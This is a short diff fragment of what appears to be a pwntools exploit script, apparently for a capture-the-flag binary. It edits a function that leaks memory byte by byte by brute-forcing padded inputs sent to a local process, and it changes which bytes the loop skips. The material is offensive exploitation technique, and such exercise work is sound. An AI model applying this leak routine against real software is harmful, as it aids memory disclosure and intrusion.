@@ -14,10 +14,10 @@ p = process(e.path)
 def leak(x, y):
     #use bad read func and problem output to brute leak without overwrite by creating its reverse at the prefix
     s = b''
-    log.info('Leaking ' + str(x) + ' chars at offset: ' + hex(y))
+    log.info('Leaking ' + str(x) + ' chars at offset ' + hex(y))
     for i in range(x):
         for j in range(1, 256):
-            if j == ord('\0') or j == ord('\n') or j == ord('a'):
+            if j == ord('\n') or j == ord('a'):
                 continue
 
             p.sendline((s + bytes([j]) + b'#' * 0x100).ljust(y, b'a'))
